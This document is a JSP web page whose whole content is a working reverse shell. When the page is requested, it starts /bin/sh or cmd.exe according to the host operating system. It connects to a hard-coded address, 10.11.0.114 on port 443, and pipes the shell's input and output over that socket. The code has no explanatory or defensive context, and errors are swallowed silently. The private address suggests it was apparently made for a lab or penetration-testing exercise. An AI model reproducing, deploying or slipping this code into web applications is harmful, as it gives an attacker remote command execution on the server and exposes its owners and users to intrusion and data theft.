<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream zg;
    OutputStream vg;

    StreamConnector( InputStream zg, OutputStream vg )
    {
      this.zg = zg;
      this.vg = vg;
    }

    public void run()
    {
      BufferedReader ko  = null;
      BufferedWriter gbv = null;
      try
      {
        ko  = new BufferedReader( new InputStreamReader( this.zg ) );
        gbv = new BufferedWriter( new OutputStreamWriter( this.vg ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ko.read( buffer, 0, buffer.length ) ) > 0 )
        {
          gbv.write( buffer, 0, length );
          gbv.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ko != null )
          ko.close();
        if( gbv != null )
          gbv.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.11.0.114", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
